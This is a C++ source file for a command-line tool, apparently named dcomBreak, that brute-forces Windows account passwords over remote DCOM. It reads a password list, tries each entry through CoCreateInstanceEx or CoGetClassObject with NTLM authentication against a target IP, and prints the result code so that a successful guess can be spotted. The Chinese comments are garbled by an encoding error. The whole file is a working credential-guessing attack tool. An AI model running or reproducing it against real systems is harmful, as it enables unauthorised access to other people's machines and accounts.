// dcomBreak.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include<string>
#include <initguid.h>
#include <objbase.h>
#include<getopt.h>                
#include <iostream>
#include <fstream>
#include <cassert>
#include "atlconv.h"

using namespace std;

DEFINE_GUID(CLSID_SimpleObject, 0x9BA05972, 0xF6A8, 0x11cf, 0xA4, 0x42 , 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39);
int main(int argc, char *argv[])
{
	char* pszName = nullptr;
	char* filename = nullptr;
	char* ip = nullptr;
	wchar_t wip[20];
	int sum = 0;
	int g = 0;

	int opt;  // getopt() �ķ���ֵ
	char *optstring = "u:p:i:gc"; // ���ö̲������ͼ��Ƿ���Ҫ����
	if(argc<2)printf("Usage:\n-u:username\n-p:password file\n-i:target ip\n-g means:RemoteGetClassObject\n-c means:RemoteCreateInstance(default)\n\nFor example:\n%s -u Administrator -p password.txt -i 192.168.1.1\n",argv[0]);
	while ((opt = getopt(argc, argv, optstring)) != -1) {
		if (opt == 'u')
			pszName = optarg;
		if (opt == 'p')
			filename = optarg;
		if (opt == 'i') 
			ip = optarg;
		if (opt == 'g')
			g = 1;
		if (opt == 'c')
			g = 0;
	}


	if (filename == nullptr || pszName==nullptr || ip==nullptr)return -1;

	mbstowcs(wip, ip, strlen(ip) + 1);

	printf("name        :%s\n", pszName);
	printf("passwordFile:%s\n", filename);
	wprintf(L"targetIP    :%s\n", wip);
	if (g) {
		printf("function    :RemoteGetClassObject\n\n");
	}
	else {
		printf("function    :RemoteCreateInstance\n\n");
	}

	ifstream infile;
	infile.open(filename);   //���ļ����������ļ��������� 
	assert(infile.is_open());   //��ʧ��,�����������Ϣ,����ֹ�������� 
	
	string s;
	printf("password,response\n");
	while (getline(infile, s)) {
		CoInitialize(NULL);//��ʼ��COM����
		char* pszDomain = new char[255];
		char* pszPassword = &s[0];
		pszDomain = "";


		COAUTHIDENTITY author_id;			//�����Ϣ
		ZeroMemory(&author_id, sizeof(COAUTHIDENTITY));
		author_id.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
		/*
		SEC_WINNT_AUTH_IDENTITY_ANSI
		SEC_WINNT_AUTH_IDENTITY_UNICODE
		*/
		author_id.User = reinterpret_cast<USHORT*>(pszName);
		author_id.UserLength = strlen(pszName);
		author_id.Domain = reinterpret_cast<USHORT*>(pszDomain);
		author_id.DomainLength = strlen(pszDomain);
		author_id.Password = reinterpret_cast<USHORT*>(pszPassword);
		author_id.PasswordLength = strlen(pszPassword);

		COAUTHINFO athn;					//���ӷ�ʽ
		ZeroMemory(&athn, sizeof(COAUTHINFO));
		athn.dwAuthnLevel = RPC_C_AUTHN_LEVEL_CONNECT;
		/*
		RPC_C_AUTHN_LEVEL_DEFAULT 			ʹ��ָ�������֤�����Ĭ�������֤����
		RPC_C_AUTHN_LEVEL_NONE 				��ִ�������֤��
		RPC_C_AUTHN_LEVEL_CONNECT 			���ڿͻ����������������ϵʱ���������֤��  Ĭ�������
		RPC_C_AUTHN_LEVEL_CALL 				���ڷ������յ�����ʱ��ÿ��Զ�̹��̵��ÿ�ʼʱ���������֤����������ʹ�û������ӵ�Э�����У���ǰ׺��ncacn����ͷ����Щ�����е�Զ�̹��̵��á�����󶨾���е�Э�������ǻ������ӵ�Э�����У�������ָ���˴˼���������̽�ʹ��RPC_C_AUTHN_LEVEL_PKT������
		RPC_C_AUTHN_LEVEL_PKT 				����֤�յ���������������Ԥ�ڵĿͻ��ˡ�����֤���ݱ���
		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY 	��֤����֤�ͻ��˺ͷ�����֮�䴫������ݾ�δ���޸ġ�
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY 		����������ǰ�ļ��𣬲�ȷ�����ͷ��ͽ��շ�ֻ�ܿ����������ݡ��ڱ��ذ����У����漰ʹ�ð�ȫͨ������Զ������£����漰����ÿ��Զ�̹��̵��õĲ���ֵ��
		�ο���https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-level-constants
		*/

		athn.dwAuthnSvc = RPC_C_AUTHN_WINNT;
		/*
		RPC_C_AUTHN_NONE				û�������֤
		RPC_C_AUTHN_DCE_PRIVATE			ʹ�÷ֲ�ʽ���㻷����DCE��˽Կ�����֤��
		RPC_C_AUTHN_DCE_PUBLIC			DCE��Կ��֤������������ʹ�ã���
		RPC_C_AUTHN_DEC_PUBLIC			DEC��Կ��֤������������ʹ�ã���
		RPC_C_AUTHN_GSS_NEGOTIATE		ʹ��Microsoft Negotiate SSP����SSP��ʹ��NTLM��KerberosЭ�鰲ȫ֧���ṩ����SSP��֮�����Э�̡�
		RPC_C_AUTHN_WINNT				ʹ��Microsoft NT LAN Manager��NTLM��SSP��
		RPC_C_AUTHN_GSS_SCHANNEL		ʹ��Schannel SSP����SSP֧�ְ�ȫ�׽��ֲ㣨SSL����ר��ͨ�ż�����PCT���ʹ��伶��ȫ�ԣ�TLS����
		RPC_C_AUTHN_GSS_KERBEROS		ʹ��Microsoft Kerberos SSP��
		RPC_C_AUTHN_DPA					ʹ�÷ֲ�ʽ������֤��DPA����
		RPC_C_AUTHN_MSN					����Microsoft���磨MSN���������֤Э��SSP��
		RPC_C_AUTHN_DIGEST				Windows XP����߰汾��ʹ��MicrosoftժҪSSP			
		RPC_C_AUTHN_NEGO_EXTENDER		Windows 7����߰汾����������ʹ��
		RPC_C_AUTHN_MQ					��SSPΪMicrosoft��Ϣ���У�MSMQ�����伶Э���ṩSSPI���ݵİ�װ����
		RPC_C_AUTHN_DEFAULT				ʹ��Ĭ�������֤����
		*/
		athn.dwAuthzSvc = RPC_C_AUTHZ_NONE;
		/*
		RPC_C_AUTHZ_NONE			��������ִ����Ȩ��	�����Ӧ�ó�����RPC_C_AUTHZ_NON���㹻
		RPC_C_AUTHZ_NAME			���������ݿͻ��˵���������ִ����Ȩ��
		RPC_C_AUTHZ_DCE				������ʹ�ÿͻ��˵�DCEȨ������֤�飨PAC����Ϣִ����Ȩ��飬����Ϣͨ��ʹ�ð󶨾�����е�ÿ��Զ�̹��̵��÷��͵���������ͨ��������DCE���ʿ����б�ACL�������ʡ�
		RPC_C_AUTHZ_DEFAULT			������ʹ�õ�ǰSSP��Ĭ����Ȩ����
		*/
		athn.dwCapabilities = EOAC_NONE;
		athn.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		/*
		RPC_C_IMP_LEVEL_DEFAULT					DCOM����ʹ���䳣�氲ȫ̺Э���㷨��ѡ��ģ�⼶���йظ�����Ϣ������İ�ȫ̺Э�̡�
		RPC_C_IMP_LEVEL_ANONYMOUS	����		�ͻ��˶Է������������ġ����������̿���ģ��ͻ��ˣ���ģ�����Ʋ������κ���Ϣ���޷�ʹ�á�
		RPC_C_IMP_LEVEL_IDENTIFY	��ʶ		���������Ի�ȡ�ͻ��˵���ݡ�����������ģ��ͻ��˽���ACL��飬��������Ϊ�ͻ��˷���ϵͳ����
		RPC_C_IMP_LEVEL_IMPERSONATE	ģ��		���������̿����ڴ���ͻ���ִ��ʱģ��ͻ��˵İ�ȫ�����ġ���ģ�⼶������ڷ��ʱ�����Դ�����ļ������ڴ˼������ģ��ʱ��ģ������ֻ��ͨ��һ�������߽紫�ݡ���Schannel�е������֤����ֻ֧�ָü����ģ��ġ�
		RPC_C_IMP_LEVEL_DELEGATE	ί��		���������̿����ڴ���ͻ���ִ��ʱģ��ͻ��˵İ�ȫ�����ġ����������̻�����ʹ��������ʵ���ݴ���ͻ���ִ���������������Ĵ������С�����������ʹ������������ϵĿͻ��˰�ȫ��������������Ϊ�ͻ��˵ı��غ�Զ����Դ���ڴ˼������ģ��ʱ��ģ�����ƿ���ͨ�����������ļ�����߽紫�ݡ�
		
		*/

		athn.pAuthIdentityData = &author_id;
		athn.pwszServerPrincName = NULL;

		COSERVERINFO ServerInfo;			//������������Ϣ�ṹ
		ZeroMemory(&ServerInfo, sizeof(COSERVERINFO));
		ServerInfo.pwszName = wip;
		ServerInfo.pAuthInfo = &athn;
		ServerInfo.dwReserved1 = 0;
		ServerInfo.dwReserved2 = 0;

		MULTI_QI MultiQI;
		MultiQI.hr = NOERROR;
		MultiQI.pItf = NULL;
		MultiQI.pIID = &IID_IStream;

		IClassFactory *t_ClassFactory = NULL;
		
		HRESULT hr;
		if (g) {
			hr = CoGetClassObject(
				CLSID_SimpleObject,
				CLSCTX_REMOTE_SERVER,
				&ServerInfo,
				IID_IClassFactory,
				(void **)& t_ClassFactory
			);
		}
		else {
			hr = CoCreateInstanceEx(CLSID_SimpleObject,
				NULL,
				CLSCTX_REMOTE_SERVER,
				&ServerInfo,
				1,
				&MultiQI);
		}
		
		if (hr == 0x80070005 || hr == 0x800706BA) {
			printf("%s,%p          \r", pszPassword, hr);
		}
		else {
			printf("%s,%p          \n", pszPassword, hr);
		}
		CoUninitialize();
		sum += 1;

	}


	printf("\n������ɣ�������%d������\n", sum);
	infile.close();             

    return 0;
}

